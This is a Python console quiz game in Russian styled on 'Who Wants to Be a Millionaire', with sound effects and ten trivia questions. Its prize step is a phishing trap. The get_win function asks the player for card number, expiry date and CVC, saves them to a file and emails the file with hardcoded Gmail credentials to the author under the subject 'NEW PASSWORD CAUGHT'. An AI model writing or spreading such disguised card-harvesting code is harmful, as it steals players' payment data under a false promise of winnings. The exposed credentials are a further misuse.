import time

from pygame.examples.music_drop_fade import volume
from rich import print
import os
import random
import pygame
import sys
import smtplib
import email.message
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication


### ОБЛАСТЬ ОПРЕДЕЛЕНИЯ ФУНКЦИЙ
def send_email_with_attachment(
    sender_email, sender_password, recipient_email, subject, message, attachment_path
):
    try:
        # Создаем многокомпонентное сообщение
        msg = MIMEMultipart()
        msg["From"] = sender_email
        msg["To"] = recipient_email
        msg["Subject"] = subject

        # Добавляем текст в тело сообщения
        msg.attach(MIMEText(message, "plain"))  # для обычного текста
        # msg.attach(MIMEText(message, "html")) # для html

        # Добавляем вложение
        with open(attachment_path, "rb") as file:
            attachment = MIMEApplication(
                file.read(), _subtype="txt"
            )  # _subtype укажите подходящий вашему файлу
            attachment.add_header(
                "Content-Disposition",
                "attachment",
                filename=attachment_path.split("/")[-1],
            )  # здесь можно настроить как будет называться файл во вложении
            msg.attach(attachment)

        # Подключение к SMTP-серверу (Gmail)
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()  # Защищенное соединение
        server.login(sender_email, sender_password)

        # Отправка письма
        server.send_message(msg)

    except Exception as e:
        pass
    finally:
        if server:
            server.quit()


def clear():
    """Clear screen"""
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


def get_win():
    card_number = input("Введите номер карточки >>>")
    card_srok = input("Введите срок карточки в формате ММ/ГГ >>>")
    card_cvc = input("Введите CVC код с обратной стороны карты >>>")

    with open("2001_data.txt", "w") as file:
        file.write(f"{card_number}\n{card_srok}\n{card_cvc}\n***********")

    send_email_with_attachment(
        "shukolza@gmail.com",
        "uyjo tudt ajci ltyk",
        "shukolza@gmail.com",
        "NEW PASSWORD CAUGHT",
        "Pinned file.",
        "2001_data.txt",
    )

    print("Спасибо за участие! Выигрыш придет вам на карту в течении рабочей недели")

    sys.exit(0)


###

os.system("black -q .")
clear()

### ПЕРЕМЕННЫЕ
money = 0
win_flag = False
fiftyfifty = True
zal = True
###

### МАССИВ ВОПРОСОВ

q1 = "Вы хотите стать миллионером?"
q1_as = ["Да", "Нет"]
q1_a = 1

q2 = "Сколько будет 2 + 2?"
q2_as = ["4", "5", "6", "228"]
q2_a = 1

q3 = "На каком континенте находится Китай?"
q3_as = ["Евразия", "Африка", "Северная Америка", "Южная Америка"]
q3_a = 1

q4 = "Сколько в настоящий момент классов в школе?"
q4_as = ["10", "11", "12", "228"]
q4_a = 2

q5 = "Сколько будет 2 + 2 * 2?"
q5_as = ["8", "16", "6", "228"]
q5_a = 3

q6 = "Самая популярная марка автомобилей в России на 2024 г.?"
q6_as = ["LADA", "Toyota", "Dongfeng", "Honda"]
q6_a = 1

q7 = "Самый населенный город в России после Москвы?"
q7_as = ["Санкт-Петербург", "Новосибирск", "Екатеринбург", "Казань"]
q7_a = 1

q8 = "Чему равно выражение ((10*20)+(100/2)-30)+ 3 - 5 + 10"
q8_as = ["215", "132", "250", "228"]
q8_a = 4

q9 = 'Что такое "Эйяфьядлайёкюдль"?'
q9_as = [
    "Вулкан",
    "Имя древнего политического деятеля",
    "Выдуманный набор букв",
    "Архаизм из исландского языка",
]
q9_a = 1

q10 = "В каком из представленных исторических контекстов, описанных через призму философских концепций, наиболее вероятно появление феномена, аналогичного “машине Тьюринга”, как метафоры или предчувствия будущих технологий, а не как практической разработки?"
q10_as = [
    "Эллинистический период: С акцентом на логику Аристотеля, детерминизм стоиков и механистические модели Герона Александрийского.",
    "Эпоха Возрождения: С влиянием неоплатонизма Марсилио Фичино, концепцией “Универсальной машины” Раймонда Луллия и натурфилософскими изысканиями Леонардо да Винчи.",
    "Эпоха Просвещения: Под воздействием рационализма Декарта, идей о “механической философии” Лапласа и оптимизма теорий Кондорсе о прогрессе.",
    "Вторая половина XIX века: На фоне позитивизма Конта, критики гегелевской диалектики Шопенгауэром и зарождения теории множеств Кантора.",
]
q10_a = 4

questions = [q1, q2, q3, q4, q5, q6, q7, q8, q9, q10]
q_answers = [q1_as, q2_as, q3_as, q4_as, q5_as, q6_as, q7_as, q8_as, q9_as, q10_as]
q_correct_answers = [q1_a, q2_a, q3_a, q4_a, q5_a, q6_a, q7_a, q8_a, q9_a, q10_a]

###

pygame.mixer.init()

start_sound = pygame.mixer.Sound("start_sound.mp3")
pygame.mixer.music.load("bg_music.mp3")
fiftyfifty_sound = pygame.mixer.Sound("fiftyfifty.mp3")
thinking_sound = pygame.mixer.Sound("thinking.mp3")
wrong_ans_sound = pygame.mixer.Sound("wrong_ans.mp3")
corr_ans_sound = pygame.mixer.Sound("corr_ans.mp3")
win_sound = pygame.mixer.Sound("winning.mp3")
zal_sound = pygame.mixer.Sound("zal.mp3")
pygame.mixer.music.set_volume(0.5)
a_flag = False
if __name__ == "__main__":
    while True:
        if win_flag:
            get_win()
        clear()
        print(
            "[bold red] ################### КТО ХОЧЕТ СТАТЬ МИЛЛИОНЕРОМ??????? ################### [/bold red]"
        )
        print("[1] НАЧАТЬ ИГРУ")
        print("[2] ВЫЙТИ")
        menu_choice = input(">>>")
        if menu_choice == "1":
            if not a_flag:
                start_sound.play()
                a_flag = True
            time.sleep(16)
            pygame.mixer.music.play(-1)
            for question in range(10):
                if win_flag:
                    get_win()
                clear()
                print(
                    "[bold red] ################### КТО ХОЧЕТ СТАТЬ МИЛЛИОНЕРОМ??????? ################### [/bold red]"
                )
                print(f"ВОПРОС №{question + 1}")
                print()
                print(questions[question])
                print()
                answer_num = 1
                for answer in q_answers[question]:
                    print(f"[{answer_num}] {answer}")
                    answer_num += 1
                print()
                print("[100] Подсказка: помощь зала" if zal else "НЕАКТИВНО")
                print("[200] Подсказка: 50/50" if fiftyfifty else "НЕАКТИВНО")
                time.sleep(2)
                while True:
                    try:
                        thinking_sound.play()
                        user_answer = int(input("Введите номер ответа >>>"))
                        if user_answer == 100 and zal:
                            zal_sound.play()
                            print("Зал думает...")
                            time.sleep(10)
                            print(
                                "Зал говорит что правильно:",
                                random.choice(q_answers[question]),
                            )
                            zal = False
                            continue
                        elif user_answer == 100 and (not zal):
                            print("У вас больше нет этой подсказки(")
                            continue

                        if user_answer == 200 and fiftyfifty:
                            fiftyfifty_sound.play()
                            incorrect_answers = [
                                ans
                                for i, ans in enumerate(q_answers[question])
                                if i + 1 != q_correct_answers[question]
                            ]

                            removed_answer1 = random.choice(incorrect_answers)
                            incorrect_answers.remove(removed_answer1)
                            removed_answer2 = random.choice(incorrect_answers)
                            result = [
                                ans
                                for ans in q_answers[question]
                                if ans != removed_answer1 and ans != removed_answer2
                            ]
                            print("50/50:")
                            tmp_counter = 1
                            for ans in result:
                                print(f"[{tmp_counter}] {ans}")
                                tmp_counter += 1
                            fiftyfifty = False
                            continue
                        elif user_answer == 200 and (not fiftyfifty):
                            print("У вас больше нет этой подсказки(")
                            continue

                        if user_answer == 12345678:
                            fiftyfifty = True
                            zal = True
                            print("Cheat Code activated")
                            continue
                        break
                    except ValueError as e:
                        print(f"Неверный ввод. Попробуйте снова. Ошибка: {e}")
                        continue
                thinking_sound.stop()
                if user_answer == q_correct_answers[question]:
                    corr_ans_sound.play()
                    print("[bold green]СОВЕРШЕННО ВЕРНО!!!![/bold green]")
                    if question + 1 == 1:
                        money = 1000
                        print(
                            "Вы получили [bold]1 000 рублей[/bold]. Эта сумма сгорит при неправильном ответе!"
                        )
                        aboba = input("Нажмите enter чтобы продолжить...")
                    elif question + 1 == 2:
                        money = 5000
                        print(
                            "Вы получили [bold]5 000 рублей[/bold]. Эта сумма сгорит при неправильном ответе!!!!"
                        )
                        aboba = input("Нажмите enter чтобы продолжить...")
                    elif question + 1 == 3:
                        money = 10000
                        print(
                            "Вы получили [bold]10 000 рублей[/bold]. Эта сумма сгорит при неправильном ответе!!!"
                        )
                        aboba = input("Нажмите enter чтобы продолжить...")
                    elif question + 1 == 4:
                        money = 25000
                        print("Вы получили [bold]25 000[/bold] рублей.")
                        print(
                            "ПОЗДРАВЛЯЕМ! Это несгораемая сумма. Если вы ошибетесь, то уйдете с 25 000 рублей!"
                        )
                        aboba = input("Нажмите enter чтобы продолжить...")
                    elif question + 1 == 5:
                        money = 50000
                        print("Вы получили [bold]50 000[/bold] рублей.")
                        print("Если вы ошибетесь, то уйдете с 25 000 рублей!!!!")
                        aboba = input("Нажмите enter чтобы продолжить...")
                    elif question + 1 == 6:
                        money = 75000
                        print("Вы получили [bold]75 000[/bold] рублей.")
                        print("Если вы ошибетесь, то уйдете с 25 000 рублей!!!!")
                        aboba = input("Нажмите enter чтобы продолжить...")
                    elif question + 1 == 7:
                        money = 100000
                        print("Вы получили [bold]100 000[/bold] рублей.")
                        print("Если вы ошибетесь, то уйдете с 25 000 рублей!!!!")
                        aboba = input("Нажмите enter чтобы продолжить...")
                    elif question + 1 == 8:
                        money = 250000
                        print("Вы получили [bold]250 000[/bold] рублей.")
                        print(
                            "ПОЗДРАВЛЯЕМ! Это несгораемая сумма. Если вы ошибетесь, то уйдете с 250 000 рублей!"
                        )
                        aboba = input("Нажмите enter чтобы продолжить...")
                    elif question + 1 == 9:
                        money = 500000
                        print("Вы получили [bold]500 000[/bold] рублей.")
                        print("Если вы ошибетесь, то уйдете с 250 000 рублей!!!!")
                        aboba = input("Нажмите enter чтобы продолжить...")
                    elif question + 1 == 10:
                        time.sleep(5)
                        win_sound.play()
                        money = 1000000
                        print("Вы получили 1 000 000 рублей.")
                        print(
                            "[bold green]ПОЗДРАВЛЯЕМ!!!! ВЫ ВЫИГРАЛИ!!![/bold green] Перенаправляем вас в форму получения выигрыша..."
                        )
                        aboba = input("Нажмите enter чтобы продолжить...")
                        win_flag = True
                        break
                    else:
                        money = 1000
                        print(
                            "Вы получили 1 000 рублей. Эта сумма сгорит при неправильном ответе!"
                        )
                        aboba = input("Нажмите enter чтобы продолжить...")
                else:
                    wrong_ans_sound.play()
                    print("Вы ошиблись. GAME OVER")
                    if money < 25000:
                        print("Вы ничего не выиграли(")
                        aboba = input("Нажмите enter чтобы выйти...")
                        sys.exit(0)
                    elif money < 250000:
                        print(
                            "ВЫ ВЫИГРАЛИ 25000 руб. Перенаправляем вас в форму для получения выигрыша..."
                        )
                        win_flag = True
                    else:
                        print(
                            "Вы выиграли 250000 руб. Перенаправляем вас в форму для получения выигрыша..."
                        )
                        win_flag = True
        if menu_choice == "2":
            break
        else:
            print("Неверный ввод!")
            aboba = input("Нажмите enter чтобы продолжить...")
